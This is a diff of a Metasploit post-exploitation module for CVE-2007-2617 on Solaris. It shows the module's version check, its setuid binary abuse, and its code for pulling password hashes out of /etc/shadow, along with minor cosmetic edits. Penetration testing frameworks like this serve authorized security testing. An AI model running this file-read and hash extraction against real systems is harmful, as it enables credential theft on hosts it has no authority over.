@@ -16,12 +16,12 @@ class MetasploitModule < Msf::Post
         'License'       => MSF_LICENSE,
         'Author'        => [
           'h00die', # metasploit module
-          'anonymous' # discovery reported anonymously to https://labs.idefense.com           
+          'iDefence' # discovery reported anonymously to https://labs.idefense.com           
         ],
         'Platform'      => [ 'solaris' ],
         'SessionTypes'  => [ 'shell', 'meterpreter' ],
         'References'    => [
-          ['CVE','2007-2617'],
+          ['CVE', '2007-2617'],
           ['URL', 'https://download.oracle.com/sunalerts/1000443.1.html'],
           ['URL', 'https://www.securityfocus.com/archive/1/468235'],
           ['EDB', '320021']
@@ -46,7 +46,6 @@ class MetasploitModule < Msf::Post
     # This ls is based on the guidance in the sun alerts article
     unin = cmd_exec '/usr/bin/ls /opt/SUNWsrspx/bin/UninstallNetConnect.*.sh'
     unin =~ /UninstallNetConnect\.([\d\.]{11})\.sh/
-    vprint_status("Version Detected: #{$1}")
     unless $1
       print_error 'NetConnect uninstall not found, either not installed or too new'
       return false
@@ -57,7 +56,7 @@ class MetasploitModule < Msf::Post
       print_error "#{version} is not vulnerable"
       return false
     end
-    print_good "#{version} is not vulnerable"
+    print_good "#{version} is vulnerable"
 
     unless get_suid_files suid_bin_path
       vprint_error "#{suid_bin_path} is not setuid, it must have been manually patched"
@@ -77,7 +76,6 @@ class MetasploitModule < Msf::Post
     vprint_good("Output: #{output}")
     return unless datastore['FILE'] == '/etc/shadow'
 
-    #process the data to pull the hash
     formatted_output = ''
     output.scan(/binaries file line: (.+)$/){ |line|
       line = line[0].to_s
